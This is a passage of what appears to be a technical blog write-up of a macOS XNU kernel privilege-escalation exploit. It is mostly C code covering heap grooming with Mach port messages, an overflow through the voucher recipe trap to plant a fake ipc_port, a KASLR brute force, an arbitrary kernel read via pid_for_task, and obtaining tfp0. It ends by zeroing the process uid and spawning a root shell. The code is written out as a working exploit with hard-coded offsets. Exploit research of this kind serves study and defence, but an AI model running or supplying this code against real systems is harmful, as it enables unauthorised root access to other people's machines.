<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">void</span></span></span><br><span class="line"><span class="function"><span class="title">free_to_zone</span><span class="params">(<span class="keyword">zone_t</span>      zone,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">vm_offset_t</span> element,</span></span></span><br><span class="line"><span class="params"><span class="function">             <span class="keyword">boolean_t</span>   poison)</span></span>;</span><br></pre></td></tr></table></figure>
<p>We use the following steps to control the memory layout</p>
<ul>
<li>
<p>First, send a lot of messages with OOL ports to kernel(don’t send to much messages here).</p>
</li>
<li>
<p>Then receive some messages to free some ports in kalloc.256.</p>
</li>
<li>
<p>Finally, send some messages again, then newly allocated memory will be allocated near the area that was just freed.</p>
</li>
</ul>
<h3 id="Overflow">Overflow</h3>
<p>Preparing parameter.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> cp_size = kalloc_size + <span class="number">8</span>;  <span class="comment">// 8 for overflow size</span></span><br><span class="line"><span class="keyword">uint64_t</span> roundup_size = roundup(cp_size, getpagesize());</span><br><span class="line"><span class="keyword">uint64_t</span> alloc_size = roundup_size + getpagesize();</span><br></pre></td></tr></table></figure>
<p>Allocating memory</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_vm_allocate(mach_task_self(), &amp;map_addr, alloc_size, VM_FLAGS_ANYWHERE);</span><br></pre></td></tr></table></figure>
<p>Unmapping memory, so it will only copy the memory between <code>start</code> and <code>end</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> base = map_addr;</span><br><span class="line"><span class="keyword">uint64_t</span> end = base + roundup_size;</span><br><span class="line"></span><br><span class="line">kr = mach_vm_deallocate(mach_task_self(), end, getpagesize());	<span class="comment">// unmap the memory</span></span><br><span class="line">   <span class="keyword">uint64_t</span> start = end - cp_size;</span><br></pre></td></tr></table></figure>
<p>Overwrite next port, make it point to our fakeport.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">memset</span>(recipe, <span class="number">0x41</span>, kalloc_size);</span><br><span class="line"><span class="built_in">memcpy</span>(recipe + kalloc_size, (<span class="keyword">uint8_t</span> *)&amp;fakeport, <span class="number">8</span>);</span><br></pre></td></tr></table></figure>
<p>Finally, we can trigger the bug, <code>vp</code> is voucher port here.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kr = mach_voucher_extract_attr_recipe_trap(vp, <span class="number">1</span>, recipe, recipe_size);</span><br></pre></td></tr></table></figure>
<h3 id="Privilege-escalation">Privilege escalation</h3>
<p>Now the <code>mach_port_t</code> points to our fake <code>ipc_port</code> in user space, which is completely controlled by us. We need to spawn our root shell.</p>
<p>Let’s take a look at the <code>port</code> structure.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">port</span> &#123;</span></span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">  <span class="keyword">kauth_cred_t</span>	p_ucred;		<span class="comment">/* Process owner&#x27;s identity. (PL) */</span> <span class="comment">// offset: 0xe8</span></span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">ucred</span> &#123;</span></span><br><span class="line">	TAILQ_ENTRY(ucred)	cr_link; <span class="comment">/* never modify this without KAUTH_CRED_HASH_LOCK */</span></span><br><span class="line">	u_long	cr_ref;			<span class="comment">/* reference count */</span></span><br><span class="line">	</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">posix_cred</span> &#123;</span></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * The credential hash depends on everything from this point on</span></span><br><span class="line"><span class="comment">	 * (see kauth_cred_get_hashkey)</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="keyword">uid_t</span>	cr_uid;			<span class="comment">/* effective user id */</span>		<span class="comment">// offset: 0x18</span></span><br><span class="line">	<span class="keyword">uid_t</span>	cr_ruid;		<span class="comment">/* real user id */</span></span><br><span class="line">	<span class="keyword">uid_t</span>	cr_svuid;		<span class="comment">/* saved user id */</span></span><br><span class="line">	<span class="keyword">short</span>	cr_ngroups;		<span class="comment">/* number of groups in advisory list */</span></span><br><span class="line">	<span class="keyword">gid_t</span>	cr_groups[NGROUPS];	<span class="comment">/* advisory group list */</span></span><br><span class="line">	<span class="keyword">gid_t</span>	cr_rgid;		<span class="comment">/* real group id */</span></span><br><span class="line">	<span class="keyword">gid_t</span>	cr_svgid;		<span class="comment">/* saved group id */</span></span><br><span class="line">	<span class="keyword">uid_t</span>	cr_gmuid;		<span class="comment">/* UID for group membership purposes */</span></span><br><span class="line">	<span class="keyword">int</span>	cr_flags;		<span class="comment">/* flags on credential */</span></span><br><span class="line">&#125; cr_posix;</span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">label</span>	*<span class="title">cr_label</span>;</span>	<span class="comment">/* MAC label */</span></span><br><span class="line">	<span class="comment">/* </span></span><br><span class="line"><span class="comment">	 * <span class="doctag">NOTE:</span> If anything else (besides the flags)</span></span><br><span class="line"><span class="comment">	 * added after the label, you must change</span></span><br><span class="line"><span class="comment">	 * kauth_cred_find().</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">au_session</span> <span class="title">cr_audit</span>;</span>		<span class="comment">/* user auditing data */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>If we can set  <code>uid_t cr_uid</code> to <code>0</code> then we can get root privilege. XNU kernel uses a link list called <code>allproc</code> to maintain the processes. So after getting kernel slide and get kernel memory rw we can easily overwrite our uid in <code>allproc</code>.</p>
<h3 id="KASLR">KASLR</h3>
<p>We already have an <code>ipc_port</code> fully controlled by us. Take a look at the following routine.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">clock_sleep_trap</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	struct clock_sleep_trap_args *args)</span> </span>&#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">  </span><br><span class="line">  <span class="keyword">if</span> (clock_name == MACH_PORT_NULL)</span><br><span class="line">		clock = &amp;clock_list[SYSTEM_CLOCK];</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		clock = port_name_to_clock(clock_name);</span><br><span class="line"></span><br><span class="line">	swtime.tv_sec  = sleep_sec;</span><br><span class="line">	swtime.tv_nsec = sleep_nsec;</span><br><span class="line"></span><br><span class="line">	<span class="comment">/*</span></span><br><span class="line"><span class="comment">	 * Call the actual clock_sleep routine.</span></span><br><span class="line"><span class="comment">	 */</span></span><br><span class="line">	rvalue = clock_sleep_internal(clock, sleep_type, &amp;swtime);</span><br><span class="line">	<span class="comment">// ...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>and <code>clock_sleep_internal</code> will return <code>KERN_FAILURE</code> when <code>clock != &amp;clock_list[SYSTEM_CLOCK]</code>.And <code>port_name_to_clock</code> returns <code>port-&gt;ip_kobject;</code>  So we can find the address of <code>clock_list</code> by brute force search.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">kern_return_t</span> kr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> clock_list = <span class="number">0xffffff8000a271c0</span>;   <span class="comment">// nm /System/Library/Kernel/kernel | grep _clock_list</span></span><br><span class="line"><span class="keyword">uint64_t</span> allproc = <span class="number">0xffffff8000abb490</span>;			<span class="comment">// nm /System/Library/Kernel/kernel | grep allproc</span></span><br><span class="line"><span class="keyword">uint64_t</span> clock_list_addr = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">uint64_t</span> base = <span class="number">0xffffff8000200000</span>;  <span class="comment">// kernel_base_addr = 0x200000 * slide_value + base</span></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_slide = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">boolean_t</span> found_clock = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">fakeport-&gt;io_bits = IO_BITS_ACTIVE | IKOT_CLOCK;	<span class="comment">// fake clock</span></span><br><span class="line">fakeport-&gt;io_lock_data[<span class="number">12</span>] = <span class="number">0x11</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0xFFFF</span>; i++) &#123;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> k = <span class="number">0</span>; k &lt;= <span class="number">0x200000</span> / <span class="number">8</span>; k += <span class="number">8</span>) &#123;</span><br><span class="line">		*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = base + i * <span class="number">0x200000</span> + k;	<span class="comment">// brute force, set fakeport-&gt;ip_kobject</span></span><br><span class="line">		kr = clock_sleep_trap(port, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>);	</span><br><span class="line">		<span class="keyword">if</span> (kr != KERN_FAILURE) &#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;[+] found clock_list! 0x%llx\n&quot;</span>, *(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>));</span><br><span class="line">			clock_list_addr = *(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>);</span><br><span class="line">			found_clock = <span class="number">1</span>;</span><br><span class="line">			<span class="keyword">goto</span> found;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>After finding clock, we can get kernel slide easily.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">kernel_slide = clock_list_addr - clock_list;</span><br><span class="line">allproc += kernel_slide;</span><br></pre></td></tr></table></figure>
<h3 id="Read-arbitrary-kernel-memory">Read arbitrary kernel memory</h3>
<p>After reading XNU source code, we can find that</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">kern_return_t</span></span></span><br><span class="line"><span class="function"><span class="title">pid_for_task</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">	struct pid_for_task_args *args)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">mach_port_name_t</span>	t = args-&gt;t;</span><br><span class="line">	<span class="keyword">user_addr_t</span>		pid_addr  = args-&gt;pid;  </span><br><span class="line">	<span class="keyword">proc_t</span> p;</span><br><span class="line">	<span class="keyword">task_t</span>		t1;</span><br><span class="line">	<span class="keyword">int</span>	pid = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">kern_return_t</span>	err = KERN_SUCCESS;</span><br><span class="line"></span><br><span class="line">	AUDIT_MACH_SYSCALL_ENTER(AUE_PIDFORTASK);</span><br><span class="line">	AUDIT_ARG(mach_port1, t);</span><br><span class="line"></span><br><span class="line">	t1 = port_name_to_task(t);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (t1 == TASK_NULL) &#123;</span><br><span class="line">		err = KERN_FAILURE;</span><br><span class="line">		<span class="keyword">goto</span> pftout;</span><br><span class="line">	&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">		p = get_bsdtask_info(t1);</span><br><span class="line">		<span class="keyword">if</span> (p) &#123;</span><br><span class="line">			pid  = proc_pid(p);</span><br><span class="line">			err = KERN_SUCCESS;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			err = KERN_FAILURE;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	task_deallocate(t1);</span><br><span class="line">pftout:</span><br><span class="line">	AUDIT_ARG(pid, pid);</span><br><span class="line">	(<span class="keyword">void</span>) copyout((<span class="keyword">char</span> *) &amp;pid, pid_addr, <span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line">	AUDIT_MACH_SYSCALL_EXIT(err);</span><br><span class="line">	<span class="keyword">return</span>(err);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>pid_for_task</code> won’t check wether the task is valid or not, but simply return</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(*(<span class="keyword">uint64_t</span> *)(task + <span class="number">0x380</span>) + <span class="number">0x10</span>)</span><br></pre></td></tr></table></figure>
<p>Remember that we have a fake port already and we also have a <code>mach_port_t</code> points to that port we have. So we can achieve arbitrary kernel memory reading by using <code>pid_for_task</code>.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">uint32_t</span> <span class="title">read_kernel</span><span class="params">(<span class="keyword">mach_port_t</span> port, <span class="keyword">void</span> *faketask, <span class="keyword">uint64_t</span> addr)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">uint32_t</span> res;</span><br><span class="line">	*(<span class="keyword">uint64_t</span> *)(faketask + <span class="number">0x380</span>) = addr - <span class="number">0x10</span>;</span><br><span class="line">	pid_for_task(port, &amp;res);</span><br><span class="line">	<span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Now, convert our fake port to a task port.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fakeport-&gt;io_bits = IKOT_TASK | IO_BITS_ACTIVE;  <span class="comment">// cast fakeport to a task</span></span><br><span class="line">fakeport-&gt;io_references = <span class="number">0xff</span>;</span><br><span class="line"><span class="keyword">char</span> *faketask = ((<span class="keyword">char</span> *)fakeport) + <span class="number">0x1000</span>;</span><br></pre></td></tr></table></figure>
<p>Set the <code>kobject</code> to our faketask</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = faketask;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0xa0</span>) = <span class="number">0xff</span>;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(faketask + <span class="number">0x10</span>) = <span class="number">0xee</span>;</span><br></pre></td></tr></table></figure>
<p>Now we can find kernel proc and our own proc.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] try to find kernel proc\n&quot;</span>);</span><br><span class="line"><span class="keyword">uint32_t</span> proc_offset = <span class="number">0</span>, r1, r2;</span><br><span class="line"><span class="keyword">uint64_t</span> kernel_proc = <span class="number">0</span>, self_proc = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="number">1</span>) &#123;</span><br><span class="line">	<span class="keyword">uint64_t</span> n;</span><br><span class="line">	r1 = read_kernel(port, faketask, allproc);</span><br><span class="line">	r2 = read_kernel(port, faketask, allproc + <span class="number">0x4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;n, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">	<span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;n + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"></span><br><span class="line">	<span class="keyword">uint32_t</span> proc = read_kernel(port, faketask, allproc + <span class="number">0x10</span>);		<span class="comment">// pid is located at the offset of 0x10</span></span><br><span class="line">	<span class="keyword">if</span> (proc == getpid()) &#123;</span><br><span class="line">		self_proc = allproc;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] found self proc pid=%d addr=0x%llx\n&quot;</span>, proc, self_proc);</span><br><span class="line">	&#125; <span class="keyword">else</span> <span class="keyword">if</span> (proc == <span class="number">0</span>) &#123;</span><br><span class="line">		kernel_proc = allproc;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;[+] found kernel proc pid=%d addr=0x%llx\n&quot;</span>, proc, kernel_proc);</span><br><span class="line">	&#125;</span><br><span class="line">	allproc = n;		<span class="comment">// next pointer is at the offset of 0</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (self_proc != <span class="number">0</span> &amp;&amp; kernel_proc != <span class="number">0</span>) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Arbitrary-kernel-memory-writing">Arbitrary kernel memory writing</h3>
<p>After getting the address of <code>kernel_proc</code>, we can dump the whole <code>task</code> and task port sturcture to user land.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> *kernel_task_port_dump = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">char</span> *kernel_task_dump = <span class="built_in">malloc</span>(<span class="number">0x1000</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint64_t</span> kernel_task = <span class="number">0</span>, kernel_itk_self = <span class="number">0</span>;  <span class="comment">// osfmk/kern/task</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// check the sturcture to get the following offset </span></span><br><span class="line">r1 = read_kernel(port, faketask, kernel_proc + <span class="number">0x18</span>);</span><br><span class="line">r2 = read_kernel(port, faketask, kernel_proc + <span class="number">0x18</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_task, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_task + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n&quot;</span>, kernel_task, kernel_itk_self);</span><br><span class="line"></span><br><span class="line">r1 = read_kernel(port, faketask, kernel_task + <span class="number">0xe8</span>);</span><br><span class="line">r2 = read_kernel(port, faketask, kernel_task + <span class="number">0xe8</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_itk_self, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;kernel_itk_self + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] kernel_task=0x%llx, kernel_itk_sself=0x%llx\n&quot;</span>, kernel_task, kernel_itk_self);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">4</span>; ++i) &#123;</span><br><span class="line">	r1 = read_kernel(port, faketask, kernel_task + i * <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(kernel_task_dump + i * <span class="number">4</span>, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x1000</span> / <span class="number">4</span>; ++i) &#123;</span><br><span class="line">	r1 = read_kernel(port, faketask, kernel_itk_self + i * <span class="number">4</span>);</span><br><span class="line">	<span class="built_in">memcpy</span>(kernel_task_port_dump + i * <span class="number">4</span>, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memcpy</span>(fakeport, kernel_task_port_dump, <span class="number">0x1000</span>);</span><br><span class="line"><span class="built_in">memcpy</span>(faketask, kernel_task_dump, <span class="number">0x1000</span>);</span><br></pre></td></tr></table></figure>
<p>Then we use <code>task_get_special_port</code> to clone a send right for one of the task’s special ports.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0x68</span>) = faketask;</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)fakeport) + <span class="number">0xa0</span>) = <span class="number">0xff</span>;</span><br><span class="line"></span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(((<span class="keyword">uint64_t</span>)faketask) + <span class="number">0x2b8</span>) = kernel_itk_self;</span><br><span class="line"><span class="keyword">mach_port_t</span> tfp0;</span><br><span class="line"></span><br><span class="line">task_get_special_port(port, <span class="number">4</span>, &amp;tfp0);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] tfp0 0x%x\n&quot;</span>, tfp0);</span><br><span class="line">fakeport-&gt;io_bits = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<h3 id="Time-to-get-root">Time to get root!</h3>
<p>Now we can directly overwrite uid to get root privilege.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//get root</span></span><br><span class="line"><span class="keyword">uint64_t</span> cred;</span><br><span class="line">r1 = read_kernel(port, faketask, self_proc + <span class="number">0xe8</span>);</span><br><span class="line">r2 = read_kernel(port, faketask, self_proc + <span class="number">0xe8</span> + <span class="number">0x4</span>);</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;cred, &amp;r1, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="keyword">char</span> *)&amp;cred + <span class="number">4</span>, &amp;r2, <span class="keyword">sizeof</span>(<span class="keyword">uint32_t</span>));</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">uint64_t</span> u = <span class="number">0</span>;</span><br><span class="line">mach_vm_write(tfp0, cred + <span class="number">0x18</span>, (<span class="keyword">vm_offset_t</span>)&amp;u, (<span class="keyword">mach_msg_type_number_t</span>)<span class="number">8</span>);</span><br><span class="line"><span class="keyword">if</span> (getuid() == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;[+] g0t r00t! getuid = %d\n&quot;</span>, getuid());</span><br></pre></td></tr></table></figure>
<p>Get root shell now!</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br></pre></td></tr></table></figure>
<h3 id="Some-sturcture-we-use…">Some sturcture we use…</h3>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">ipc_port</span>	        *<span class="title">ipc_port_t</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPC_PORT_NULL		((ipc_port_t) 0UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPC_PORT_DEAD		((ipc_port_t)~0UL)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> IPC_PORT_VALID(port) \</span></span><br><span class="line"><span class="meta">	((port) != IPC_PORT_NULL &amp;&amp; (port) != IPC_PORT_DEAD)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="keyword">ipc_port_t</span> 		<span class="keyword">mach_port_t</span>;</span><br></pre></td></tr></table></figure>
